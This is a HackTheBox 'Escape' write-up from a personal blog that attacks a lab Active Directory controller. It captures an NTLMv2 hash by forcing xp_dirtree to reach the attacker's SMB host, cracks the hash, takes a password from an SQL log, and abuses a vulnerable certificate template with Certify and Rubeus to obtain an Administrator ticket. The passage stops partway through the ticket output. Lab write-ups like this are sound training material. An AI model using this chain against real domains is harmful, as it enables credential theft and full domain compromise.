# HTB: Escape

Hello, it's qurius! Welcome to my first blog post ever. Today we are taking a look at the `Escape` machine from [HackTheBox](https://www.hackthebox.com/). It was a medium difficulty machine which involved stealing of NTLM hashes and abusing AD CS certificate templates. This one was on the easier side of medium machines spectrum in my opinion (if you're familiar with Active Directory exploitation). Nonetheless, it was fun and I really enjoyed it, let's take a look.

First let's start with the nmap.

## Reconnaissance & Enumeration

### Nmap

As with every machine, let's start with a Nmap scan. I use my own Rust wrapper which you can find [here](https://github.com/frostvandrer/rustmap). It was my first Rust project and it's very simple and not optimized, but it gets the job done. Let's look at the results.

```bsah
# Nmap 7.93 scan initiated Sun Apr 16 12:25:51 2023 as: nmap -sC -sV -oA nmap/escape -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49704,49712,49714 10.10.11.202
Nmap scan report for 10.10.11.202
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-16 18:25:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-16T18:27:27+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-16T18:27:26+00:00; +7h59m57s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-04-15T14:07:09
|_Not valid after:  2053-04-15T14:07:09
|_ssl-date: 2023-04-16T18:27:27+00:00; +7h59m58s from scanner time.
| ms-sql-ntlm-info:
|   10.10.11.202:1433:
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.202:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-16T18:27:27+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-04-16T18:27:26+00:00; +7h59m57s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-04-16T18:26:46
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 16 12:27:29 2023 -- 1 IP address (1 host up) scanned in 98.61 seconds
```

We are dealing with a Windows 10 machine. Since we can see port 88 open as well as LDAP ports open, we can assume we are dealing with the domain controller. We can see the domain names as `sequel.htb` and `dc.sequel.htb`. Let's add those to our `/etc/hosts` file.

```bash
printf "%s\t%s\n\n" "10.10.11.202" "sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
```

### LDAP

Let's start with LDAP. We can try lo login without any credentials, sometimes you're lucky and it works. Unfortunatelly, in this case it does not work and we need credentials.

```bash
➜  Escape ldapsearch -x -H ldap://10.10.11.202 -s sub -b 'DC=sequel,DC=htb'     
# extended LDIF
#
# LDAPv3
# base <DC=sequel,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

### SMB

Since there is no web server running on the box we can proceed with enumerating `SMB`. We can user `crackmapexec` to look at the shares.

```bash
➜  Escape crackmapexec smb 10.10.11.202 -u 'guest' -p '' --shares
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\guest:
SMB         10.10.11.202    445    DC               [+] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share
SMB         10.10.11.202    445    DC               Public          READ
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share
```

Looks like we have a `READ` access to the `Public` share. We can use `smbclient` to take a look at the files.

```bash
➜  Escape smbclient \\\\10.10.11.202\\Public
Password for [WORKGROUP\qurius]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 12:51:25 2022
  ..                                  D        0  Sat Nov 19 12:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022

                5184255 blocks of size 4096. 1437818 blocks available
```

It looks like the only file inside the share is `SQL Server Procedures.pdf`. This might be interesting since we saw that the `Microsoft SQL Server 2019` is running on the box on port 1433. Let's take a closer look at the PDF.

```bash
smb: \> get "SQL Server Procedures.pdf" 
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (77.9 KiloBytes/sec) (average 77.9 KiloBytes/sec)
smb: \> exit
```

First let's use `exiftool` to check the metadata of the PDF to hunt for possible usernames or to see what was used to generate the PDF.

```bash
➜  Escape exiftool "SQL Server Procedures.pdf"
ExifTool Version Number         : 12.57
File Name                       : SQL Server Procedures.pdf
Directory                       : .
File Size                       : 50 kB
File Modification Date/Time     : 2023:04:16 03:49:46-07:00
File Access Date/Time           : 2023:06:16 00:26:07-07:00
File Inode Change Date/Time     : 2023:04:16 03:49:46-07:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 2
Creator                         : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/0.15.6 Chrome/100.0.4896.160 Electron/18.3.5 Safari/537.36
Producer                        : Skia/PDF m100
Create Date                     : 2022:11:18 13:39:43+00:00
Modify Date                     : 2022:11:18 13:39:43+00:00
```

Unfortunatelly, this did not yield any interesting results other than that the creator of the box probably uses `Obsidian` for their notes. Let's take a closer look at the contents of the PDF.

![](/assets/Escape-SQL1.png)

Well, it looks like there is just a "mock" instance of the database on the DC and that it will be removed when `Tom` comes back from the vacation. On the second page of the PDf we even get credentials that allow us to log in to the `MSSQL`. If we're lucky, Tom is not back from the vacation yet and we can log in to the database.

![](/assets/Escape-SQL2.png)

We can use `Impacket MSSQL Client` to connect to the database.

```bash
➜  Escape python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sequel/PublicUser:GuestUserCantWrite1@sequel.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
```

Let's take look at the database's structure. Since it's just a "mock" instance we do not expect any useful data here, but it's still worth to check.

```bash
SQL> SELECT name FROM master.sys.databases;
name

--------------------------------------------------------------------------------------------------------------------------------

master

tempdb

model

msdb

SQL>
```

There were just 4 databases and none of them contained any useful information. Most of it was just blank. We can try to use those credentials against `SMB` or `WINRM`, but everything fails. 

## Capturing NTLMv2 hash

What we can do now is to try to steal a `NTLMv2` hash. Since we can execute SQL commands on the DC, we could try to fetch a remote resource and force the database to use `NTLMv2` authentication so we can capture the hash.

We can user following command to try to fetch the remote content.

```sql
exec master.dbo.xp_dirtree '\\10.10.14.88\smb'
```

We can see that it indeed worked and we successfuly captured the `NTLMv2` hash:

```bash
➜  Escape python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support smb .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.202,52565)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:4ec19fdc5c4ba3ab5ea3774187b5f385:0101000000000000807a669c709dd901cc7f5af4f95c760f0000000001001000500058006e005200690043004100740003001000500058006e0052006900430041007400020010006d0074006100740058004b0069005800040010006d0074006100740058004b006900580007000800807a669c709dd90106000400020000000800300030000000000000000000000000300000115adc3d0fc18217cf60cf08c80ea3442c0cc5e81825de469ed7f9eb469f94200a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00380038000000000000000000
[*] Closing down connection (10.10.11.202,52565)
[*] Remaining connections []
```

We can now hop to my host OS and use `hashcat` to crack the `NTLMv2` hash.

```powershell
PS C:\Tools\Hashcat> .\hashcat.exe .\sql_svc.hash ..\Wordlists\rockyou.txt
.
.
5600 | NetNTLMv2 | Network Protocol
.
.
SQL_SVC::sequel:aaaaaaaaaaaaaaaa:4ec19fdc5c4ba3ab5ea3774187b5f385:0101000000000000807a669c709dd901cc7f5af4f95c760f0000000001001000500058006e005200690043004100740003001000500058006e0052006900430041007400020010006d0074006100740058004b0069005800040010006d0074006100740058004b006900580007000800807a669c709dd90106000400020000000800300030000000000000000000000000300000115adc3d0fc18217cf60cf08c80ea3442c0cc5e81825de469ed7f9eb469f94200a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00380038000000000000000000:REGGIE1234ronnie
```

We have now a new set of credentials: `sql_svc:REGGIE1234ronnie`.

Since we saw `WINRM` ports open we can confirm that we can login as user `sql_svc` via `WINRM` in crackmapexec.

```bash
➜  Escape crackmapexec winrm sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie' 
SMB         sequel.htb      5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        sequel.htb      5985   DC               [*] http://sequel.htb:5985/wsman
WINRM       sequel.htb      5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

## Shell as sql_svc

We confirmed that we indeed can log in via `WINRM` as user `sql_svc`. Let's use `evil-winrm` to get a shell.

```bash
➜  Escape evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```

We still do not have access to `user.txt` flag so let's enumerate the filesystem.

```powershell
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows


*Evil-WinRM* PS C:\>
```

We can see that there is `SQLServer` directory in `C:\`, which kind of pops to our eyes. Let's take a look inside.

```powershell
*Evil-WinRM* PS C:\SQLServer> ls


    Directory: C:\SQLServer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe
```

We have a couple of binaries, config files and logs. I think logs might be a good place to look.

```powershell
*Evil-WinRM* PS C:\SQLServer\Logs> cat ERRORLOG.BAK
2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 <X64> (Build 17763: ) (Hypervisor)

2022-11-18 13:43:05.97 Server      UTC adjustment: -8:00
2022-11-18 13:43:05.97 Server      (c) Microsoft Corporation.
2022-11-18 13:43:05.97 Server      All rights reserved.
2022-11-18 13:43:05.97 Server      Server process ID is 3788.
2022-11-18 13:43:05.97 Server      System Manufacturer: 'VMware, Inc.', System Model: 'VMware7,1'.
2022-11-18 13:43:05.97 Server      Authentication mode is MIXED.
2022-11-18 13:43:05.97 Server      Logging SQL Server messages in file 'C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\Log\ERRORLOG'.
2022-11-18 13:43:05.97 Server      The service account is 'NT Service\MSSQL$SQLMOCK'. This is an informational message; no user action is required.
2022-11-18 13:43:05.97 Server      Registry startup parameters:
         -d C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\master.mdf
         -e C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\Log\ERRORLOG
         -l C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf
2022-11-18 13:43:05.97 Server      Command Line Startup Parameters:
         -s "SQLMOCK"
         -m "SqlSetup"
         -Q
         -q "SQL_Latin1_General_CP1_CI_AS"
         -T 4022
         -T 4010
         -T 3659
         -T 3610
         -T 8015
.
.
.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
2022-11-18 13:43:08.24 spid51      Changed database context to 'master'.
2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
2022-11-18 13:43:09.29 spid9s      SQL Server is terminating in response to a 'stop' request from Service Control Manager. This is an informational message only. No user action is required.
2022-11-18 13:43:09.31 spid9s      .NET Framework runtime has been stopped.
2022-11-18 13:43:09.43 spid9s      SQL Trace was stopped due to server shutdown. Trace ID = '1'. This is an informational message only; no user action is required.
```

We can see a failed login attempt from `sequel.htb\Ryan.Cooper`. He tired again but put password instead of his login name to the password field and it ended up in the log. We now posses a new set of credentials:

`Ryan.Cooper:NuclearMosquito3`

Let's see if we can login.

```powershell
➜  Escape evil-winrm -i sequel.htb -u Ryan.Cooper -p NuclearMosquito3

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cat ..\Desktop\user.txt
9998ebbbb***********************
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```

We indeed can and now we can finally read the `user.txt` flag.

## Privilege escalation - Shell as Ryan.Cooper

### Post-Exploitation Enumeration

Enumerating the filesystem did not show anything interesting straight away so I decided to upload and run `WinPEAS`.

```powershell
*Evil-WinRM* PS C:\programdata> upload /home/qurius/htb/boxes/medium/owned/Escape/winpeas.exe
   
Info: Uploading /home/qurius/htb/boxes/medium/owned/Escape/winpeas.exe to C:\programdata\winpeas.exe
   
Data: 2704724 bytes of 2704724 bytes copied
  
Info: Upload successful!
*Evil-WinRM* PS C:\programdata> .\winpeas.exe
.
.
.
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files                                                                                                                                  

  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb                                                                                                                                                                                                                                                                                                                                   
  Subject            :                                                                                                                                                                                                                                                                                                                                                                      
  ValidDate          : 11/18/2022 1:05:34 PM                                                                                                                                                                                                                                                                                                                                                
  ExpiryDate         : 11/18/2023 1:05:34 PM                                                                                                                                                                                                                                                                                                                                                
  HasPrivateKey      : True                                                                                                                                                                                                                                                                                                                                                                 
  StoreLocation      : LocalMachine                                                                                                                                                                                                                                                                                                                                                         
  KeyExportable      : True                                                                                                                                                                                                                                                                                                                                                                 
  Thumbprint         : B3954D2D39DCEF1A673D6AEB9DE9116891CE57B2                                                                                                                                                                                                                                                                                                                           
 
  Template           : Template=Kerberos Authentication(1.3.6.1.4.1.311.21.8.15399414.11998038.16730805.7332313.6448437.247.1.33), Major Version Number=110, Minor Version Number=0                                                                                                                                                                                                         
  Enhanced Key Usages                                                                                                                                                                                                                                                                                                                                                                       
       Client Authentication     [*] Certificate is used for client authentication!                                                                                                                                                                                                                                                                                                         
       Server Authentication                                                                                                                                                                                                                                                                                                                                                                
       Smart Card Logon                                                                                                                                                                                                                                                                                                                                                                     
       KDC Authentication                                                                                                                                                                                                                                                                                                                                                                   
   =================================================================================================                                                                                                                                                                                                                                                                                        
  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb                                                                                                                                                                                                                                                                                                                                   
  Subject            : CN=sequel-DC-CA, DC=sequel, DC=htb                                                                                                                                                                                                                                                                                                                                   
  ValidDate          : 11/18/2022 12:58:46 PM                                                                                                                                                                                                                                                                                                                                               
  ExpiryDate         : 11/18/2121 1:08:46 PM                                                                                                                                                                                                                                                                                                                                                
  HasPrivateKey      : True                                                                                                                                                                                                                                                                                                                                                                 
  StoreLocation      : LocalMachine                                                                                                                                                                                                                                                                                                                                                         
  KeyExportable      : True                                
  Thumbprint         : A263EA89CAFE503BB33513E359747FD262F91A56                                
   
   =================================================================================================                                                                                          

  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
  Subject            : CN=dc.sequel.htb
  ValidDate          : 11/18/2022 1:20:35 PM               
  ExpiryDate         : 11/18/2023 1:20:35 PM                                                                                    
  HasPrivateKey      : True                                    
  StoreLocation      : LocalMachine                                                            
  KeyExportable      : True                                                                                                                                                                                                                                      
  Thumbprint         : 742AB4522191331767395039DB9B3B2E27B6F7FA

  Template           : DomainController                                                                                         
  Enhanced Key Usages  
       Client Authentication     [*] Certificate is used for client authentication!                                             
       Server Authentication                                                                                                    
   =================================================================================================
.
.
.
```

`WinPEAS` told us that the domain uses certificates for authentication. This is very interesing. We can use tools like [Certify](https://github.com/GhostPack/Certify) to enumerate the certificates.

### Enumerating certificates with Certify

We can dowload [Certify](https://github.com/GhostPack/Certify) to our Windows VM and compile it from source, then upload it to the target machine.

```powershell
*Evil-WinRM* PS C:\programdata> .\certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
.
.
.
[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.0538947
*Evil-WinRM* PS C:\programdata>
```

We can see a couple of problems resulting in why is this certificate template vulnerable. Let's dig into it a bit.

There are 2 main problems:
1. `msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT` - This ensures that the user that requests the certificate based on this template can supply name of the object the certificate is for. This means that the user can request a certificate for another user e.g. administrator (we'll do this later)
2. `Enrollment Rights: sequel\Domain Users` - This means that any domain user can request a certificate based on this template.

### Abusing AD CS certificate template with Certify & Rubeus

What we can do is request a certificate for the `Administrator` user which we can later use the get a TGT and use it to log into the box. Since we have everything we need. We can use Certify and Rubeus, to perform the attack. We can do it in 5 steps.

#### Step 1 - Request the Administrator certificate

```powershell
.\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```

We can see that we successfully obtained the certificate:

```powershell
*Evil-WinRM* PS C:\programdata> .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 10

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwViYcNVIk8e2CG0mU33Uad3Hs82tXYhPTmLNZ/n/6gJD7Odz
A9t7fE2Ep3IhJ/IpmBp9rHIv+/aS9uQ41b+0pKVkzlRsZTVRDNBoMbebcvm/OSez
mN57W29CZFztJS+ebwTl9SjutA69z2iQthq4Ja0FaWdWYIC3CNTIHygqt1xfY6wx
4SrQZjeSnrqBUmT3UopJvkfvsvaLeLzfwyk24fll2MQ1ShZ2wkD5TgIoAe53VNWY
r+vHjbLWN5ltVkmSptnTIz2dsch52N9vX64drxEb4V51t3siGjTg/KgWP6fUHYpv
rP7taJH3rMwPFgSiXOPOk4rRroLNEtT3H1YgAQIDAQABAoIBAHrZ+nKncuhDm4yb
.
.
.
```

#### Step 2 - Transform the certificate from PEM to PFX format

We can copy the certificate that Certify has provided us with and transform it to `.pfx` format using `openssl`.

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### Step 3 - Request Administrator TGT

We now have a certificate to authenticate as `Administrator`. What we can do now, is to issue ourselves a `Ticket Granting Ticket` (TGT). We can do this with [Rubeus](https://github.com/GhostPack/Rubeus). We again download and compile from source in our Windows VM and upload it to the box.

```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:C:\programdata\cert.pfx
```

We upload the `cert.pfx` and `Rubeus.exe` onto the target machine and run the above command.

```powershell
*Evil-WinRM* PS C:\programdata> upload /home/qurius/htb/boxes/medium/owned/Escape/cert.pfx

Info: Uploading /home/qurius/htb/boxes/medium/owned/Escape/cert.pfx to C:\programdata\cert.pfx

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> upload /home/qurius/htb/boxes/medium/owned/Escape/Rubeus.exe

Info: Uploading /home/qurius/htb/boxes/medium/owned/Escape/Rubeus.exe to C:\programdata\Rubeus.exe

Data: 370688 bytes of 370688 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:Administrator /certificate:C:\programdata\cert.pfx

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMC
      AQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBJnkmr2Vo6jO
      3v0CbdxTfvOYdwMKZ/j2EVPk/iyu7sf392dZIY3vfzOUnopWvtoqshQdudlf7aZUfWoFvhPcnu+roGcx
      ahqq8To4WOCbXfndj96mx97rYPQJ28+XNbPPYi0OfNSOjnfxNIv/Dtfz13zCpCubA45lecokxPbFENKT
      dj/kXbNBVcxrtSlylu9kxTerwqT7/ahPf65ObY1nWVd6Ui+4iXZDqYgnUZLOQTf5arpDE+lQY+w1nG6U
      KGX5foBmZWKpyfUlxOUtEpP/po5A+OUTAax2s/AKIIMy24zkXTmceWP0CymiXgtaDUFh7Lvq4JvOjx7s
      4MNzKIr0VrC+NymMc8YJ6JRzL22CcN7W7SeFw+2urjM2OrSx6d7aiks8xcB/xq0+VUEYwK2+whv2J1qx
      C0Jedx1GnoSWvauSsAoFSnQiCJPjXptdZQqIJ6O70hB7++3BWuif4czNPOyU5ZY9NKMa2MsQr8YYBfpU
      VL+nyT3Ko9rLRu8P1Fc9bnBeT4nnMQnJqy3NFT7Gqss//DYYxKjFWVP9Nv7HLu0dsXtL5viYQi9uy4Pi
      rWuPUKL+6iDJrEoSQFRHRNmquamNWOZvWCP3oACzEzTogITvBoQRr7pLO3PpOtIOPl/izkwWBKu3mX5p
      XltePp0AEA7LG7YRrAHKYRsAT9MJgT5/IVlkOSm/emKC7tpNh4lgWOOzISmiAzfq9+sNAdoyEBF3jLo+
      wWb8TZnM6RZ36tZu/Q1ty3aYzISTay2UZDj6XziwasFxsAUOQ/4zdQQ07TwXc0uJkYQ48RiFVfVy3e8O
